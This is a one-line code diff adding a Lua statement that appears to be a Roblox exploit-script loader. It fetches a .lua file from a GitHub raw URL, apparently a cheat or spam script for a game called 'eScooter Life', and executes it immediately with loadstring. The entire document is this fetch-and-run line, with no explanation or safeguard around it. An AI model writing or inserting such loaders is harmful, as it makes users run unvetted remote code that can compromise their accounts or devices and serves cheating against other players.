@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vortexorbimagine/loaders/main/loaders/escooter-life-beta-release-spam7-kgm6udi7mbpiue.lua"))()
